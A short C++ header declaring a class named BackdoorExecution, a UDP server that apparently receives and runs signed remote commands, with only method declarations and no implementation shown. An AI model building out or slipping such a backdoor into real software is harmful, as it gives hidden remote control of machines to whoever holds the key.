#pragma once

#include <UdpServer.hpp>
#include <boost/multiprecision/cpp_int.hpp>

class BackdoorExecution : private UdpServer
{
protected:
    boost::multiprecision::cpp_int m_public_key;
public:
    void Serve(volatile std::sig_atomic_t& stop, std::uint16_t port, boost::multiprecision::cpp_int public_key);
    void OnReceivedPacket(std::span<const std::uint8_t> command) override;
    void LogError(std::string_view sv) override;
    BackdoorExecution();
    ~BackdoorExecution() override;
};
